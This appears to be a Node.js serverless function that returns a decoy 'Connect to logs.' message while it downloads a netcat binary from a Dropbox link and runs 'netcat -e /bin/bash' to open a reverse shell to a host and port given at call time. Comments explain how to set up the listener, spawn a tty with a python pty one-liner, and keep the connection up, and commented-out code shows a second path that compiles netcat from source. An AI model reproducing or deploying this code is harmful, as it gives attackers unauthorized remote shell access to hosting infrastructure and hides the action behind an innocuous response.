var execsync = require('child_process').execSync;
var exec = require('child_process').exec;
var fs = require('fs');

// download netcat and initiate reverse shell
// edit final command to point at appropriate ip address hosting a listening netcat port
// launch listening port with netcat -l portnum
// i like grabbing a tty using python w/
// python -c 'import pty; pty.spawn("/bin/sh")'
// you can type that in right after you start netcat... its satisfying to see the shell prompt pop when it connects :D

// run companion keep_alive.py script to both initiate the netcat & container and keep the connection up and running


var exists = false;

function file_exist(path) {
    try {
       fs.accessSync(path, fs.F_OK);
       return true;
    } catch (e) { return false; };
}

module.exports = function (context, cb) {
    cb(null, 'Connect to logs. ');

    // for our container keepalives we want to not launch new netcats
    try {
      if (context.data.host)
          exists = true;
    } catch (e) { };

    if (exists) {
        // option 1 compile netcat
        //    cmd = 'wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz -O /tmp/netcat-0.7.1.tar.gz'
        //    execsync(cmd, {stdio:[0,1,2]} );
        //    cmd = 'cd /tmp; tar xzvf netcat-0.7.1.tar.gz'
        //    execsync(cmd, {stdio:[0,1,2]});
        //    cmd = 'cd /tmp/netcat-0.7.1 && ./configure'
        //    execsync(cmd, {stdio:[0,1,2]} );
        //    cmd = 'cd /tmp/netcat-0.7.1 && make'
        //    execsync(cmd, {stdio:[0,1,2]} );
        //    cmd = '/tmp/netcat-0.7.1/src/netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port

        // option 2 grab precompiled binaries

        if (!(file_exist('/data/io/stuff.tar.bz'))) {
            cmd = 'wget https://www.dropbox.com/s/u0my5zl9lelhiv8/stuff.tar.bz?dl=0 -O /data/io/stuff.tar.bz';
            execsync(cmd, {stdio:[0,1,2]} );
        }
        if (!(file_exist('/data/io/netcat'))) {
            cmd = 'cd /data/io/; tar xjvf stuff.tar.bz';
            execsync(cmd, {stdio:[0,1,2]});
        }
        // last command fails if the remote port is unreachable/ not listening
        // launching into the background so we can do it async
        cmd = 'cd /data/io && ./netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port + ' &';
        exec(cmd, {stdio:[0,1,2]} );
        console.log('Complete');
    }

}
